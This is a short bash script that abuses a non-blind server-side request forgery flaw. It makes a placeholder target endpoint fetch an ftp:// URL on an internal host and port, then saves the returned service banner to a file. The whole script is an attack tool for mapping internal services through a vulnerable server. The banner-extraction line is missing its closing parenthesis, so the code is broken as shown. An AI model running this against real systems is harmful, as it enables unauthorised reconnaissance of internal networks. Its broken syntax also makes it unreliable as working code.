#!/bin/bash

host=${1:-dockerhost}
port=${2:-8080}
prefix=${3:-serveme}

set +H #turn off history expansion to freely use !

response=$(curl -G "https://target/ssrf_vulnerability" --data-urlencode "url=ftp://${host}:${port}/")
#since is non-blind SSRF, if the banner exists, it should be in the response.
#just a dummy grep example over the response
banner=$(echo "$response"|grep -o "<CONVENIENT_BANNER_TAG>.*</CONVENIENT_BANNER_TAG>"
echo "$banner" >> banners.txt